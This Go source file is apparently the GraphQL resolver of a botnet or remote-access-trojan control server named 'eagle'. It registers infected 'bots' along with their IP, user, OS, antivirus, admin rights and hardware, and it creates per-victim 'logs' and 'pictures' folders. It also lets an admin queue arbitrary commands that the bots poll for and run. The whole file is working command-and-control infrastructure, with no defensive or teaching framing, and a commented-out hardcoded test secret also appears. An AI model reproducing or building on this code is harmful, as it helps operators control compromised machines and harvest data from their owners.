package api

import (
	"context"
	"fmt"
	"log"
	"os"
	"path"
	"time"

	"github.com/MShoaei/eagle/middlewares"
	"github.com/MShoaei/eagle/models"
	"github.com/MShoaei/eagle/utils"
	"github.com/dgrijalva/jwt-go"
	"github.com/gofrs/uuid"
	"github.com/jinzhu/gorm"
	"golang.org/x/crypto/bcrypt"
)

type Resolver struct {
	DB *gorm.DB
	// bots []models.Bot
}

func (r *Resolver) Mutation() MutationResolver {
	return &mutationResolver{r}
}
func (r *Resolver) Query() QueryResolver {
	return &queryResolver{r}
}

type mutationResolver struct{ *Resolver }

func (r *mutationResolver) CreateAdmin(ctx context.Context, username string, password string, passwordConfirm string) (*models.Admin, error) {
	if len(password) < 8 || password != passwordConfirm {
		return &models.Admin{}, fmt.Errorf("weak password or passwords do not math")
	}

	passwordHash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return &models.Admin{}, err
	}

	newID, _ := uuid.NewV4()
	admin := models.Admin{
		ID:           newID.String(),
		Username:     username,
		PasswordHash: string(passwordHash),
	}

	if err := r.DB.Create(&admin).Error; err != nil {
		return &models.Admin{}, err
	}

	return &admin, nil
}

func (r *mutationResolver) CreateBot(ctx context.Context, input models.NewBot) (*models.Bot, error) {
	newID, _ := uuid.NewV4()
	bot := models.Bot{
		ID:          newID.String(),
		IP:          input.IP,
		WhoAmI:      input.WhoAmI,
		Os:          input.Os,
		InstallDate: input.InstallDate,
		Admin:       input.Admin,
		Av:          input.Av,
		CPU:         input.CPU,
		Gpu:         input.Gpu,
		Version:     input.Version,
	}
	if err := r.DB.Create(&bot).Error; err != nil {
		return &models.Bot{}, err
	}
	profile := path.Join(utils.ProfilesDir, bot.ID)
	if err := utils.Fs.Mkdir(profile, os.ModeDir|os.ModePerm); err != nil {
		log.Fatal(err)
		return &bot, err
	}
	utils.Fs.Mkdir(path.Join(profile, "logs"), os.ModeDir|os.ModePerm)
	utils.Fs.Mkdir(path.Join(profile, "pictures"), os.ModeDir|os.ModePerm)
	return &bot, nil
}

func (r *mutationResolver) DeleteBot(ctx context.Context, id string) (bool, error) {
	bot := models.Bot{
		ID: id,
	}

	if err := r.DB.Where("id = ?", id).Delete(&bot).Error; err != nil {
		return false, err
	}
	return true, nil
}

func (r *mutationResolver) SetCommand(ctx context.Context, ids []string, command string) (bool, error) {
	bot := models.Bot{}
	if err := r.DB.Model(&bot).Where("id IN (?)", ids).UpdateColumn("new_command", command).Error; err != nil {
		return false, err
	}
	return true, nil
}

type queryResolver struct{ *Resolver }

func (r *queryResolver) Me(ctx context.Context) (*models.Admin, error) {
	return nil, nil
}

func (r *queryResolver) Bots(ctx context.Context) ([]models.Bot, error) {
	// getUserID(ctx)
	var bots []models.Bot
	// r.db = models.DB
	// if err := r.db.Open(); err != nil {
	// 	return nil, err
	// }

	r.DB.Find(&bots)
	if err := r.DB.Find(&bots).Error; err != nil {
		return nil, err
	}
	return bots, nil
}

func (r *queryResolver) Bot(ctx context.Context, id string) (*models.Bot, error) {
	bot := models.Bot{}

	if err := r.DB.Where("id = ?", id).Find(&bot).Error; err != nil {
		return nil, err
	}
	return &bot, nil
}

func (r *queryResolver) GetCommand(ctx context.Context, id string, done bool) (string, error) {
	cmd := models.Bot{}
	if err := r.DB.Select("new_command").Where("id = ?", id).Find(&cmd).Error; err != nil {
		return "", err
	}
	return cmd.NewCommand, nil
}

func (r *queryResolver) TokenAuth(ctx context.Context, username string, password string) (string, error) {
	admin := models.Admin{}

	if r.DB.Where("username = ?", username).First(&admin).RecordNotFound() {
		return "", gorm.ErrRecordNotFound
	}

	if err := bcrypt.CompareHashAndPassword([]byte(admin.PasswordHash), []byte(password)); err != nil {
		return "", fmt.Errorf("incorrect Password")
	}

	claims := jwt.StandardClaims{
		ExpiresAt: time.Now().Add(time.Minute * 30).Unix(),
		Id:        admin.ID,
		IssuedAt:  time.Now().Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodRS512, claims)
	// fmt.Println(string(middlewares.SignKey))
	ss, err := token.SignedString(middlewares.SignKey)
	// ss, err := token.SignedString([]byte("thisisatestsecret"))
	if err != nil {
		return "", err
	}

	return ss, nil
}
